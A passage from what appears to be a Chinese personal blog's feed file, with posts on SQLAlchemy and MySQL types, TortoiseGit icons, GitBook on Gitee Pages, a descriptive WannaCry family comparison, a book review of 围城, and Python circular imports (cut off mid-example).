f代表可以使用&#123;&#125;引用变量</span></span><br><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建引擎</span></span><br><span class="line">engine = create_engine(DB_URI)</span><br><span class="line"><span class="comment"># 创建SQLORM基类，注意这里要加参数，参数为上一步创建的引擎</span></span><br><span class="line">Base = declarative_base(engine)</span><br><span class="line"><span class="comment"># 构建session对象</span></span><br><span class="line">session = sessionmaker(engine)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实体表Data</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">"data_type"</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    booleanData = Column(Boolean(<span class="number">0</span>))  <span class="comment"># TINYINT(1B)</span></span><br><span class="line">    smallInteger = Column(SmallInteger)  <span class="comment"># SMALLINT(2B)</span></span><br><span class="line">    integer = Column(Integer)  <span class="comment"># INT或INTEGER(4B)</span></span><br><span class="line">    bigInteger = Column(BigInteger)  <span class="comment"># BIGINT(8B)</span></span><br><span class="line">    floatData = Column(Float)  <span class="comment"># FLOAT(4B)</span></span><br><span class="line">    numericData = Column(Numeric)  <span class="comment"># DECIMAL或DEC</span></span><br><span class="line">    dateData = Column(Date)  <span class="comment"># DATE(3B)</span></span><br><span class="line">    timeData = Column(Time)  <span class="comment"># TIME(3B)</span></span><br><span class="line">    dateTime = Column(DateTime)  <span class="comment"># DATETIME(8B)</span></span><br><span class="line">    stringData = Column(String(<span class="number">250</span>))  <span class="comment"># VARCHAR</span></span><br><span class="line">    textData = Column(Text)</span><br><span class="line">    mediumText = Column(Text(<span class="number">65536</span>))</span><br><span class="line">    longText = Column(Text(<span class="number">16777216</span>))</span><br><span class="line">    largeBinary = Column(LargeBinary)</span><br><span class="line">    mediumBlob = Column(LargeBinary(<span class="number">65536</span>))</span><br><span class="line">    longBlob = Column(LargeBinary(<span class="number">16777216</span>))</span><br><span class="line">    enumData = Column(Enum(<span class="string">'father'</span>, <span class="string">'mother'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将模型映射到数据库中</span></span><br><span class="line"><span class="comment"># 即如果数据库中没有student表则创建映射表student</span></span><br><span class="line">Base.metadata.create_all()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除Data表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_table</span><span class="params">()</span>:</span></span><br><span class="line">    Data.__table__.drop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"test data type"</span>)</span><br><span class="line">    <span class="comment"># del_table()</span></span><br></pre></td></tr></table></figure><h2 id="32-mysql表结构"><a class="markdownIt-Anchor" href="#32-mysql表结构"></a> 3.2 MySQL表结构</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; DESC data_type;</span><br><span class="line">+--------------+-------------------------+------+-----+---------+----------------+</span><br><span class="line">| Field        | Type                    | Null | Key | Default | Extra          |</span><br><span class="line">+--------------+-------------------------+------+-----+---------+----------------+</span><br><span class="line">| id           | int                     | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| booleanData  | tinyint(1)              | YES  |     | NULL    |                |</span><br><span class="line">| smallInteger | smallint                | YES  |     | NULL    |                |</span><br><span class="line">| <span class="built_in">integer</span>      | int                     | YES  |     | NULL    |                |</span><br><span class="line">| bigInteger   | bigint                  | YES  |     | NULL    |                |</span><br><span class="line">| floatData    | <span class="built_in">float</span>                   | YES  |     | NULL    |                |</span><br><span class="line">| numericData  | decimal(10,0)           | YES  |     | NULL    |                |</span><br><span class="line">| dateData     | date                    | YES  |     | NULL    |                |</span><br><span class="line">| timeData     | time                    | YES  |     | NULL    |                |</span><br><span class="line">| dateTime     | datetime                | YES  |     | NULL    |                |</span><br><span class="line">| stringData   | varchar(250)            | YES  |     | NULL    |                |</span><br><span class="line">| textData     | text                    | YES  |     | NULL    |                |</span><br><span class="line">| mediumText   | mediumtext              | YES  |     | NULL    |                |</span><br><span class="line">| longText     | longtext                | YES  |     | NULL    |                |</span><br><span class="line">| largeBinary  | blob                    | YES  |     | NULL    |                |</span><br><span class="line">| mediumBlob   | mediumblob              | YES  |     | NULL    |                |</span><br><span class="line">| longBlob     | longblob                | YES  |     | NULL    |                |</span><br><span class="line">| enumData     | enum(<span class="string">'father'</span>,<span class="string">'mother'</span>) | YES  |     | NULL    |                |</span><br><span class="line">+--------------+-------------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.cnblogs.com/hzjdpawn/p/12893270.html" target="_blank" rel="noopener">Flask SQLAlchemy 数据类型和数据库的对应关系 </a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修复TortoiseGit文件夹和文件状态图标不显示问题</title>
      <link href="/2022/03/25/%E4%BF%AE%E5%A4%8DTortoiseGit%E6%96%87%E4%BB%B6%E5%A4%B9%E5%92%8C%E6%96%87%E4%BB%B6%E7%8A%B6%E6%80%81%E5%9B%BE%E6%A0%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/"/>
      <url>/2022/03/25/%E4%BF%AE%E5%A4%8DTortoiseGit%E6%96%87%E4%BB%B6%E5%A4%B9%E5%92%8C%E6%96%87%E4%BB%B6%E7%8A%B6%E6%80%81%E5%9B%BE%E6%A0%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>今天打开git仓库项目，突然发现文件夹和文件状态图标不再显示。</p><h1 id="2-解决修改注册表overlay的值"><a class="markdownIt-Anchor" href="#2-解决修改注册表overlay的值"></a> 2 解决(修改注册表Overlay的值)</h1><p>参考：<a href="https://www.cnblogs.com/xiesong/p/5761352.html" target="_blank" rel="noopener">【随记】修复TortoiseGit文件夹和文件状态图标不显示问题</a></p><ol><li><p>按<code>Win+R</code>键打开运行对话框，输入 <code>regedit</code> ，打开注册表；</p></li><li><p>在注册表中找到 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers</code></p></li><li><p>修改tortoise相关的名称（如在名称前加一个空格前缀）使其置于开始位置：</p><img src="https://s2.loli.net/2022/03/25/fvyk7c52IzhD1HQ.png" width="900" height="400" alt="图片名称" align="center" id="117"></li><li><p>重启电脑，图标正常显示：</p><img src="https://s2.loli.net/2022/03/25/Ca8BDKsJQLfoqnY.png" width="900" height="300" alt="图片名称" align="center" id="118"></li></ol><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/mcsbary/article/details/90665192" target="_blank" rel="noopener">TortoiseGit 显示文件状态图标</a></li><li><a href="https://blog.csdn.net/quantum7/article/details/84639445" target="_blank" rel="noopener">解决TortoiseGit文件夹和文件状态图标不显示问题</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>借助gitbook与Gitee Pages服务搭建静态网站</title>
      <link href="/2022/03/25/%E5%80%9F%E5%8A%A9gitbook%E4%B8%8EGitee-Pages%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99/"/>
      <url>/2022/03/25/%E5%80%9F%E5%8A%A9gitbook%E4%B8%8EGitee-Pages%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>在做PA助教，需要将讲义重新部署下，静态网站。讲义仓库在Gitee，所以使用 <code>gitbook + Gitee Pages</code> 实现该需求。本文将以自己的<code>Algorithm</code>仓库进行演示：</p><h1 id="2-实现"><a class="markdownIt-Anchor" href="#2-实现"></a> 2 实现</h1><p>主要参考：<a href="https://zhuanlan.zhihu.com/p/34946169" target="_blank" rel="noopener">使用 Gitbook 打造你的电子书</a></p><h2 id="21-本地安装gitbook"><a class="markdownIt-Anchor" href="#21-本地安装gitbook"></a> 2.1 本地安装gitbook</h2><h3 id="211-安装gitbook"><a class="markdownIt-Anchor" href="#211-安装gitbook"></a> 2.1.1 安装gitbook</h3><p>环境要求：</p><ul><li>NodeJS（推荐使用v4.0.0及以上版本）</li><li>Windows，Linux，Unix 或 Mac OS X</li></ul><p>Windows下在cmd中输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gitbook-cli -g</span><br></pre></td></tr></table></figure><p>执行下面的命令，查看 GitBook 版本，以验证安装成功：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook -V</span><br></pre></td></tr></table></figure><h3 id="212-gitbook-项目结构"><a class="markdownIt-Anchor" href="#212-gitbook-项目结构"></a> 2.1.2 GitBook 项目结构</h3><p>GitBook使用简单的目录结构。在 SUMMARY （即 <a href="http://SUMMARY.md" target="_blank" rel="noopener">SUMMARY.md</a> 文件）中列出的所有 Markdown / Asciidoc 文件将被转换为 HTML。</p><p>一个基本的 GitBook 电子书结构通常如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── book.json</span><br><span class="line">├── README.md</span><br><span class="line">├── SUMMARY.md</span><br><span class="line">├── chapter-1/</span><br><span class="line">|   ├── README.md</span><br><span class="line">|   └── something.md</span><br><span class="line">└── chapter-2/</span><br><span class="line">    ├── README.md</span><br><span class="line">    └── something.md</span><br></pre></td></tr></table></figure><p>GitBook 特殊文件的功能：</p><table><thead><tr><th style="text-align:center">文件</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">book.json</td><td style="text-align:center">配置数据、包括插件配置(可选)</td></tr><tr><td style="text-align:center"><a href="http://README.md" target="_blank" rel="noopener">README.md</a></td><td style="text-align:center">电子书的前言或每个文件夹的简介(必选)</td></tr><tr><td style="text-align:center"><a href="http://SUMMARY.md" target="_blank" rel="noopener">SUMMARY.md</a></td><td style="text-align:center">电子书目录(可选)</td></tr><tr><td style="text-align:center"><a href="http://GLOSSARY.md" target="_blank" rel="noopener">GLOSSARY.md</a></td><td style="text-align:center">词汇/注释术语列表(可选)</td></tr></tbody></table><h3 id="213-创建bookjson与summarymd"><a class="markdownIt-Anchor" href="#213-创建bookjson与summarymd"></a> 2.1.3 <a href="http://xn--book-pj9fv59d.xn--jsonSUMMARY-hr8q.md" target="_blank" rel="noopener">创建book.json与SUMMARY.md</a></h3><ul><li>参考：<a href="https://www.jianshu.com/p/2160f1ba68a0" target="_blank" rel="noopener">Gitbook根据目录生成Summary.md</a></li></ul><p><code>book.json</code> 文件需要自己创建，<code>SUMMARY.md</code>文件可以使用插件(gitbook-plugin-summary)自动生成。</p><p>安装插件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i gitbook-plugin-summary --save</span><br></pre></td></tr></table></figure><p>在<code>Algorithm</code>项目根目录创建 <code>book.json</code> 文件，并输入：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"plugins"</span>: [ </span><br><span class="line"><span class="string">"summary"</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="214-目录顺序"><a class="markdownIt-Anchor" href="#214-目录顺序"></a> 2.1.4 目录顺序</h3><p>关于数字序号的顺序：<code>Ch10</code>、<code>Ch11</code>、<code>Ch1</code>、<code>Ch2</code>、<code>Ch3</code>、<code>Ch4</code>…</p><p>所以需要修改序号：<code>Ch1</code>、<code>Ch2</code>、<code>Ch3</code>、<code>Ch4</code>、…、<code>Ch10</code>、<code>Ch11</code></p><h3 id="215-数学公式"><a class="markdownIt-Anchor" href="#215-数学公式"></a> 2.1.5 数学公式</h3><p>使用<code>mathjax</code>，但是不支持行内公式，效果不好，后续再看怎么解决这一块。</p><p>参考：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/132638228" target="_blank" rel="noopener">gitbook使用mathjax</a></li><li><a href="https://blog.csdn.net/qq_42898299/article/details/106779945" target="_blank" rel="noopener">gitbook采坑笔记（一：Mathjax）</a></li></ul><h3 id="216-构建与启动服务"><a class="markdownIt-Anchor" href="#216-构建与启动服务"></a> 2.1.6 构建与启动服务</h3><p>使用下面的命令，会在项目的目录下生成一个 <code>_book</code> 目录，里面的内容为静态站点的资源文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook build</span><br></pre></td></tr></table></figure><p>使用下列命令会运行一个 web 服务, 通过 <code>http://localhost:4000/</code> 可以预览书籍：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook serve</span><br></pre></td></tr></table></figure><p>至此，<code>Algorithm</code>仓库对应的静态网站已经部署成功。</p><h2 id="22-实现在线访问"><a class="markdownIt-Anchor" href="#22-实现在线访问"></a> 2.2 实现在线访问</h2><p>在Gitee上打开<code>Algorithm</code>仓库，点击<code>服务</code>标签，选择<code>Gitee Pages</code>图标。</p><p><strong>注意</strong>：Gitee Pages服务需要实名认证，审核需要数个工作日。</p><img src="https://s2.loli.net/2022/03/25/w3mcMnqHIf4dyUG.png" width="800" height="400" alt="图片名称" align="center" id="116"><p><strong>部署目录需要是<code>_book</code></strong></p><p>现在访问 <a href="http://dragon-liu.gitee.io/algorithm" target="_blank" rel="noopener">http://dragon-liu.gitee.io/algorithm</a> 即可。</p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【恶意家族进化分析】勒索病毒WannaCry家族</title>
      <link href="/2022/03/10/%E3%80%90%E6%81%B6%E6%84%8F%E5%AE%B6%E6%97%8F%E8%BF%9B%E5%8C%96%E5%88%86%E6%9E%90%E3%80%91%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92WannaCry%E5%AE%B6%E6%97%8F/"/>
      <url>/2022/03/10/%E3%80%90%E6%81%B6%E6%84%8F%E5%AE%B6%E6%97%8F%E8%BF%9B%E5%8C%96%E5%88%86%E6%9E%90%E3%80%91%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92WannaCry%E5%AE%B6%E6%97%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>WannaCry（又叫Wanna Decryptor），一种<strong>加密型勒索软件兼蠕虫病毒</strong>（Encrypting Ransomware Worm），大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播，为WanaCrypt0r 1.0的变种。</p><img src="https://s2.loli.net/2022/03/10/8HeVcJj9ELopBkn.png" width="600" height="400" alt="图片名称" align="center" id="106"><p>恶意软件数据集中的家族标签：<code>Trojan.Ransom.WannaCryptor.A</code>、<code>Trojan.Ransom.WannaCryptor.H</code></p><ul><li><a href>百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/WannaCry#cite_note-trendmicro-12" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="2-进化"><a class="markdownIt-Anchor" href="#2-进化"></a> 2 进化</h1><h2 id="21-wanacrypt0r-10"><a class="markdownIt-Anchor" href="#21-wanacrypt0r-10"></a> 2.1 WanaCrypt0r 1.0</h2><h2 id="22-wannacry"><a class="markdownIt-Anchor" href="#22-wannacry"></a> 2.2 WannaCry</h2><h2 id="23-wannasister"><a class="markdownIt-Anchor" href="#23-wannasister"></a> 2.3 WannaSister</h2><h1 id="3-进化图示"><a class="markdownIt-Anchor" href="#3-进化图示"></a> 3 进化图示</h1><img src="https://s2.loli.net/2022/03/10/takqNpIlwMs82VT.png" width="800" height="500" alt="图片名称" align="center" id="107"><table><thead><tr><th style="text-align:center">对比项</th><th style="text-align:center">WannaCry1.0版</th><th style="text-align:center">WannaCry2.0版</th></tr></thead><tbody><tr><td style="text-align:center">时间戳</td><td style="text-align:center">未修改（最早2017.3.27）</td><td style="text-align:center">被修改</td></tr><tr><td style="text-align:center">标题</td><td style="text-align:center">Wanna Decryptor 1.0</td><td style="text-align:center">Wana Decrypt0r 2.0</td></tr><tr><td style="text-align:center">c.wry(配置文件其中包含比特币钱包地址和下载TOR地址等)</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">b.wry(!WannaCryptor!.bmp桌面图片)</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">r.wry(!Please Read Me!.txt FAQ)</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">f.wry(测试解压文件的路径)</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">t.wry加密模块是一个DLL文件)</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">u.wry(!WannaDecryptor!.exe可执行程序)</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">m.wry(语言文件是RTF文件格式)</td><td style="text-align:center">存在（1种语言）</td><td style="text-align:center">存在（28种语言）</td></tr><tr><td style="text-align:center">s.wnry(释放内嵌TOR包TaskData)</td><td style="text-align:center">不存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">m.vbs(脚本文件创建快捷方式)</td><td style="text-align:center">不存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">00000000.res</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">00000000.pky为RSA子公钥</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">00000000.eky是RSA子私钥使用RSA主公钥加密后的文件</td><td style="text-align:center">存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">taskdl.exe删除移动到TMP目录的文件</td><td style="text-align:center">不存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">taskse.exe使远程会话可以看到勒索窗体</td><td style="text-align:center">不存在</td><td style="text-align:center">存在</td></tr><tr><td style="text-align:center">资源解压密码</td><td style="text-align:center">wcry@123、wcry@2016</td><td style="text-align:center">WNcry@2ol7</td></tr></tbody></table><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.sohu.com/a/140989865_114837" target="_blank" rel="noopener">https://www.sohu.com/a/140989865_114837</a></li><li><a href="https://www.qq.com/a/20170614/057733.htm" target="_blank" rel="noopener">https://www.qq.com/a/20170614/057733.htm</a></li><li><a href="https://www.chinanews.com.cn/m/sh/2017/05-16/8225594.shtml" target="_blank" rel="noopener">https://www.chinanews.com.cn/m/sh/2017/05-16/8225594.shtml</a></li><li><a href="https://www.antiy.com/response/wannacry.html" target="_blank" rel="noopener">https://www.antiy.com/response/wannacry.html</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《围城》书籍</title>
      <link href="/2022/03/10/%E3%80%8A%E5%9B%B4%E5%9F%8E%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/03/10/%E3%80%8A%E5%9B%B4%E5%9F%8E%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>《围城》是一幅栩栩如生的世井百态图，人生的酸甜苦辣千般滋味均在其中得到了淋漓尽致的体现。钱钟书先生将自己的语言天才并入极其渊博的知识，再添加上一些讽刺主义的幽默调料，以一书而定江山。《围城》显示给我们一个真正的聪明人是怎样看人生，又怎样用所有作家都必得使用的文字来表述自己的“观”和“感”的。</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>钱锺书（1910年11月21日－1998年12月19日），原名仰先，字哲良，后改名锺书，字默存，号槐聚，曾用笔名中书君，男，江苏无锡人，中国作家、文学研究家。晓畅多种外文，包括英、法、德语，亦懂拉丁文、意大利文、西班牙文等。台湾作家、诗人兼讲座教授余光中分析当代中文时，常称道钱西学列于中国人之第一流，两岸三地之作家如陶杰、宋淇，行文之时，亦多交许赞之。</p><ul><li><a href="https://baike.baidu.com/item/%E9%92%B1%E9%94%BA%E4%B9%A6/139034#4_3" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/%E9%8C%A2%E9%8D%BE%E6%9B%B8" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><p>xxx</p><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>昨晚读到46%(方鸿渐去往三闾大学的途中)，实在读不下去了，遂罢；等年龄大些，成熟些，再来续读。</p><p>文章开始男主方鸿渐就与周淑英（父亲自作主张订婚）、鲍小姐（露水情缘）、苏小姐（苏小姐妥协的结果）、唐小姐（貌似是白月光）产生爱情关系。一方面不太欣赏这样快餐式的爱情，另一方面自己还是对美好爱情具有种种憧憬。</p><p>豆瓣一用户的<a href="https://m.douban.com/book/comment/702501983?dt_platform=com.douban.activity.qq_session&amp;dt_dapp=1" target="_blank" rel="noopener">评论</a>：</p><blockquote><p>时隔多年重读，钟书先生的幽默、老辣、聪明、刻薄仍让人拍案激赏。无论是方鸿渐，还是孙柔嘉，抑或苏文纨，他们的寻常人生，不过就像苏小姐的爱情，起初因为“看得太名贵了，不肯随便施与”，及至遭遇现实的损耗，就只能迅速缴械、自怅自悔了，如此过了十几年，恐怕也只能借年轻人的生气来温暖自己的衰朽。深于一切语言、一切啼笑，“围城”内外，饱含对人生的讽刺和感伤。</p></blockquote><p>微信短视频上南师郦波教授的一段话：</p><blockquote><p>我突然想起方文山老师那首著名的”天青色等烟雨，而我在等你&quot;，这句话是有讲究的。天青色的那个釉很难烧，他要等，他一定要等到下雨的时候，才开火烧那个，他要那个温度和湿度刚好。你不知道什么时候天会下雨，你就在这等啊，等雨一来的时候你开始烧，刚好温度湿度都特别好的时候，那个最美的天青色就出来了。所以你不知道你的另一半会什么时候出现，你只能用你的生命去等，一定有一刻，你刚好在他刚好来，你们的天青色。</p></blockquote><p>台大教授欧丽娟在B站上的一段视频也蛮不错的：<a href="https://www.bilibili.com/video/BV1Jm4y1R7N9?spm_id_from=333.999.0.0" target="_blank" rel="noopener">视频链接</a></p><blockquote><p>我们现代人的自由恋爱 很好玩呐</p><p>有太多的形态是<strong>因为误会而结合 因为了解而分开</strong> 得之我姓 不得我命 所以啊 很多的恋爱失败就是因为发现彼此不适合</p><p>这么这么多的恋爱经验里面告诉我们说：<strong>你不应该改变你自己 可是你因为这场突如其来的一种迷穴 而让那个强大的爱情完全改变了自己</strong> 老实说 这恐怕就是灾难的开始 因为你已经变得不是你</p><p>真的 <strong>不要误以为你对一个人可以为所欲为 用来证明你们之间情感亲密</strong> 这真的是一个谬论 可是 这个谬论太普及 甚至呢 被当成是一个错误的爱情的版本 对于爱情的定义里面就是说 我爱你 因为世上有你 所以我爱你 你是因为有什么条件的 不是因为计算过的 正因为有你 所以我觉得这个世界很圆满 我觉得我的生命也很完整 爱情就是这么样的不讲道理 也因为他的不讲道理 使得这个爱情 不也有一种我们最喜欢的一种浪漫性质吗？<strong>我不是因为计算过了 才爱上你 而这样的爱呢 也不会因为有一个更好的人 你就被取代掉 这不就是真正的爱情吗？</strong></p><p>我很希望 这不要让你们的爱情破灭 因为你们都还蛮 20岁很浪漫哈 但是我总觉得浪漫 固然很美 可是脚踏实地 他才会茁壮 也才会伟大哈 他绝对不是一个美丽的幻想而已</p><p><strong>爱 并非存在于相互的凝视 而是 两个人一起望向 外在的同一方向</strong></p></blockquote><p>回头想想，大学四年马上结束，但是还没吃过二食堂的冒菜，也许下一个中午就去尝尝，也许还没来得及去就毕业了。</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><p>xxx</p><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><p>xxx</p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-解决循环引用问题</title>
      <link href="/2022/03/09/Python-%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8%E9%97%AE%E9%A2%98/"/>
      <url>/2022/03/09/Python-%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>当项目中的模块过多，或功能划分不够清晰时会出现循环引用的问题。最近在做毕设，涉及后台管理系统时出现循环引用的问题。</p><p>主要copy于：<a href="https://www.jianshu.com/p/a1e91cc53b07" target="_blank" rel="noopener">python解决循环引用问题</a></p><h1 id="2-示例"><a class="markdownIt-Anchor" href="#2-示例"></a> 2 示例</h1><p><code>moduleA.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> moduleB <span class="keyword">import</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">    b()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a()</span><br></pre></td></tr></table></figure><p><code>moduleB.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> moduleA <span class="keyword">import</span> c</span><br><span class="line"></span><br><span class="line"><span 